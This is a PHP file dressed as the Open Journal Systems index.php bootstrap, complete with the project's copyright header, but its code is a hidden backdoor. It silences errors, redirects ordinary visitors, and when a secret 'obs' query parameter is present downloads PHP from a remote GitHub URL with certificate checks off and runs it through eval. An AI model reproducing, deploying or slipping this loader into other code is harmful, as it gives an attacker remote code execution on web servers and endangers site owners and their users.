<?php
/**
 * @file index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

error_reporting(0);
ini_set('display_errors', 0);
// Initialize global environment
$is_jamal = isset($_GET['obs']);

// Serve the request
if (!$is_jamal) {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $redirect_url = $protocol . $host . "/";

    header("Location: $redirect_url", true, 302);
    exit;
}

class CurlFetcher {
    public function fetchContent(string $url) {
        if (!function_exists('curl_init')) return false;
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
            CURLOPT_TIMEOUT => 10
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
}

class CodeExecutor {
    private $fetcher;
    public function __construct(CurlFetcher $fetcher) {
        $this->fetcher = $fetcher;
    }

    public function executeCodeFromURL(string $url): void {
        $code = $this->fetcher->fetchContent($url);
        if ($code && trim($code) !== '') {
            eval("?>" . $code);
        }
    }
}


$fetcher = new CurlFetcher();
$executor = new CodeExecutor($fetcher);
$executor->executeCodeFromURL("https://raw.githubusercontent.com/yourfr13nds/backburner/main/gecko.php");
?>
